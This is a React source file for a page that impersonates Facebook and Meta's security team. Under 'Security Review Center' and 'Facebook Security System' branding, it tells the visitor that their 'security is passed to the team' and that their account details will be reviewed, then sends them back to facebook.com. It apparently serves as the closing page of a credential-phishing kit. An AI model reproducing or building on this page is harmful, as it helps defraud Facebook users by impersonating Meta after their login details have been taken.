import { Link } from "react-router-dom";
import { ShieldCheck, CheckCircle2, Lock, ArrowLeft } from "lucide-react";

export default function Dashboard() {
  return (
    <div className="min-h-screen bg-[#18191a] text-[#e4e6eb] flex flex-col justify-between p-4 selection:bg-[#0866ff] selection:text-white">
      
      {/* Top Header Bar */}
      <header className="flex items-center justify-between w-full max-w-md mx-auto py-3 border-b border-[#393a3b]">
        <a
          href="https://www.facebook.com"
          target="_blank"
          rel="noopener noreferrer"
          aria-label="Back to Facebook"
          className="text-[#b0b3b8] hover:text-white transition p-1"
        >
          <ArrowLeft size={22} />
        </a>
        <span className="text-sm font-semibold tracking-wide text-white uppercase">
          Security Review Center
        </span>
        <div className="w-6" /> {/* Spacer for symmetry */}
      </header>

      {/* Main Content Area */}
      <main className="w-full max-w-md mx-auto my-auto flex flex-col items-center text-center px-2 py-8">
        
        {/* Security / Facebook Verification Badge Icon Stack */}
        <div className="relative mb-6">
          <div className="flex h-24 w-24 items-center justify-center rounded-full bg-[#0866ff]/15 border-2 border-[#0866ff]/40 text-[#0866ff] shadow-xl">
            <ShieldCheck size={48} strokeWidth={2} />
          </div>
          <div className="absolute -bottom-1 -right-1 flex h-9 w-9 items-center justify-center rounded-full bg-[#23a55a] text-white shadow-md border-2 border-[#18191a]">
            <CheckCircle2 size={20} strokeWidth={2.5} />
          </div>
        </div>

        {/* Brand / Security Tag */}
        <div className="inline-flex items-center gap-1.5 px-3 py-1 rounded-full bg-[#242526] border border-[#393a3b] text-xs font-medium text-[#b0b3b8] mb-4">
          <Lock size={12} className="text-[#0866ff]" />
          <span>Facebook Security System</span>
        </div>

        {/* Congratulatory & Status Text */}
        <h1 className="text-xl font-bold text-white mb-3 leading-snug">
          Congratulations, your security is passed to the team!
        </h1>

        <p className="text-sm text-[#b0b3b8] leading-relaxed max-w-xs mb-8">
          The team will review your account details and announce you soon. Thank you for securing your profile.
        </p>

        {/* Action Button Linking to Facebook */}
        <a
          href="https://www.facebook.com"
          target="_blank"
          rel="noopener noreferrer"
          className="w-full rounded-full bg-[#0866ff] px-6 py-3.5 text-sm font-semibold text-white shadow-lg transition hover:bg-[#1877f2] text-center"
        >
          Back to Facebook
        </a>
      </main>

      {/* Footer Meta Branding */}
      <footer className="w-full max-w-md mx-auto py-4 text-center">
        <div className="flex items-center justify-center gap-1.5 text-xs font-bold tracking-widest text-[#8a8d91]">
          <span>∞</span>
          <span>Meta Security</span>
        </div>
      </footer>

    </div>
  );
}